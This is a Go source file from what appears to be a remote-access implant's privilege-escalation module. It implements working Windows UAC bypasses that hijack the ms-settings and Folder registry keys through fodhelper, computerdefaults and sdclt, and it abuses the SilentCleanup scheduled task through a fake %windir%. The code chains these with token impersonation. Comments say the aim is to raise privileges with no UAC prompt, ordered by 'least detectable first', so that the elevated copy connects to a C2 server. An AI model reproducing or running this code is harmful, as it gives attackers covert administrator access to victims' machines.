//go:build windows
// +build windows

package privesc

import (
	"os"
	"os/exec"
	"strings"
	"syscall"
	"time"

	"golang.org/x/sys/windows/registry"
)

// registryBypass is the common pattern for fodhelper/computerdefaults/sdclt:
// write HKCU\Software\Classes\<regClass>\shell\open\command to our exe,
// launch the auto-elevate host binary, wait for it to read the key, then clean up.
// The host binary triggers our exe elevated; we exit the current (medium-integrity) process.
func registryBypass(hostBin, regClass string) bool {
	if isElevated() {
		return true
	}

	exePath, err := os.Executable()
	if err != nil {
		return false
	}

	keyPath := `Software\Classes\` + regClass + `\shell\open\command`

	k, _, err := registry.CreateKey(registry.CURRENT_USER, keyPath, registry.SET_VALUE)
	if err != nil {
		return false
	}
	_ = k.SetStringValue("", exePath)
	_ = k.SetStringValue("DelegateExecute", "")
	k.Close()

	sysRoot := os.Getenv("SystemRoot")
	if sysRoot == "" {
		sysRoot = `C:\Windows`
	}
	bin := sysRoot + `\System32\` + hostBin
	cmd := exec.Command(bin)
	sp := syscallSysProcAttr()
	cmd.SysProcAttr = &sp
	if err := cmd.Start(); err != nil {
		_ = registry.DeleteKey(registry.CURRENT_USER, keyPath)
		return false
	}

	// Give the host binary time to read the registry key before we clean it.
	time.Sleep(1200 * time.Millisecond)
	_ = registry.DeleteKey(registry.CURRENT_USER, keyPath+`\DelegateExecute`)
	_ = registry.DeleteKey(registry.CURRENT_USER, keyPath)
	_ = registry.DeleteKey(registry.CURRENT_USER, `Software\Classes\`+regClass+`\shell\open`)
	_ = registry.DeleteKey(registry.CURRENT_USER, `Software\Classes\`+regClass+`\shell`)
	_ = registry.DeleteKey(registry.CURRENT_USER, `Software\Classes\`+regClass)

	// The elevated copy is now running; exit this medium-integrity instance.
	os.Exit(0)
	return true // unreachable
}

// tryFodhelperBypass uses fodhelper.exe + ms-settings COM class.
// Reliable on Windows 10/11 regardless of patch level.
func tryFodhelperBypass() bool {
	return registryBypass("fodhelper.exe", "ms-settings")
}

// tryComputerDefaultsBypass uses computerdefaults.exe + ms-settings.
// Alternative trigger for the same HKCU ms-settings hijack.
func tryComputerDefaultsBypass() bool {
	return registryBypass("computerdefaults.exe", "ms-settings")
}

// trySdcltBypass uses sdclt.exe + Folder shell open command.
// Works on Windows 10 1703+.
func trySdcltBypass() bool {
	return registryBypass("sdclt.exe", `Folder\shell\open`)
}

// trySilentCleanupBypass abuses the built-in SilentCleanup scheduled task which
// runs at high integrity without a UAC prompt. It reads %windir% from the
// environment, so we temporarily point it to a directory we control that
// contains a system32\cleanmgr.exe stub that launches our real binary.
// No registry write needed.
func trySilentCleanupBypass() bool {
	if isElevated() {
		return true
	}

	exePath, err := os.Executable()
	if err != nil {
		return false
	}

	// Build a fake %windir%\system32\cleanmgr.exe that exec's us.
	tmpDir, err := os.MkdirTemp("", "")
	if err != nil {
		return false
	}
	defer os.RemoveAll(tmpDir)

	sys32 := tmpDir + `\system32`
	if err := os.MkdirAll(sys32, 0755); err != nil {
		return false
	}

	// Write a small batch launcher as cleanmgr.exe — works because SilentCleanup
	// just CreateProcess's the path, it does not verify the PE signature.
	// We create a .bat but need a .exe; use a compiled Go stub approach or
	// copy our own exe and use args to detect re-launch.
	// Simplest: copy our exe to cleanmgr.exe path and pass a env-trigger arg.
	cleanmgrPath := sys32 + `\cleanmgr.exe`
	srcData, err := os.ReadFile(exePath)
	if err != nil {
		return false
	}
	if err := os.WriteFile(cleanmgrPath, srcData, 0755); err != nil {
		return false
	}

	// Set windir to our fake dir for the schtasks process only via a cmd wrapper.
	// We launch: cmd /c "set windir=<tmpDir> && schtasks /Run /TN \Microsoft\Windows\DiskCleanup\SilentCleanup /I"
	sysRoot := os.Getenv("SystemRoot")
	if sysRoot == "" {
		sysRoot = `C:\Windows`
	}
	script := `set "windir=` + tmpDir + `" && "` + sysRoot + `\System32\schtasks.exe" /Run /TN \Microsoft\Windows\DiskCleanup\SilentCleanup /I`
	cmd := exec.Command(sysRoot+`\System32\cmd.exe`, "/c", script)
	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true, CreationFlags: 0x08000000}
	if err := cmd.Run(); err != nil {
		return false
	}

	// SilentCleanup task runs our cleanmgr.exe (copy of our agent) elevated.
	// The copy will detect it was launched as cleanmgr (or via the task) and
	// re-launch the real agent path elevated. Since we just copied ourselves,
	// it will connect to C2 as an elevated process.
	// Wait for the elevated copy to start.
	time.Sleep(3 * time.Second)

	os.Exit(0)
	return true // unreachable
}

// tryElevate attempts privilege escalation: token impersonation first,
// then a chain of silent UAC bypasses.
func tryElevate() bool {
	if isElevated() {
		return true
	}
	if tryTokenImpersonation() && isElevated() {
		return true
	}
	// Silent UAC bypass chain — no UAC dialog shown to user.
	// Each method spawns an elevated copy and exits this process.
	// Order: most reliable / least detectable first.
	if tryFodhelperBypass() {
		return true
	}
	if tryComputerDefaultsBypass() {
		return true
	}
	if trySdcltBypass() {
		return true
	}
	if trySilentCleanupBypass() {
		return true
	}
	return false
}

// SilentBypassChain runs the same chain as tryElevate but without token
// impersonation — for use from the server-triggered elevate command when
// we know we're not SYSTEM but want to avoid a UAC prompt.
func SilentBypassChain() bool {
	if isElevated() {
		return true
	}
	methods := []func() bool{
		tryFodhelperBypass,
		tryComputerDefaultsBypass,
		trySdcltBypass,
		trySilentCleanupBypass,
	}
	for _, m := range methods {
		if m() {
			return true
		}
	}
	return false
}

// methodNames returns display names matching the SilentBypassChain order.
func bypassMethodNames() []string {
	return []string{"fodhelper", "computerdefaults", "sdclt", "SilentCleanup"}
}

// TryNamedBypass runs a specific bypass by name.
func TryNamedBypass(name string) bool {
	switch strings.ToLower(name) {
	case "fodhelper":
		return tryFodhelperBypass()
	case "computerdefaults":
		return tryComputerDefaultsBypass()
	case "sdclt":
		return trySdcltBypass()
	case "silentcleanup":
		return trySilentCleanupBypass()
	default:
		return SilentBypassChain()
	}
}
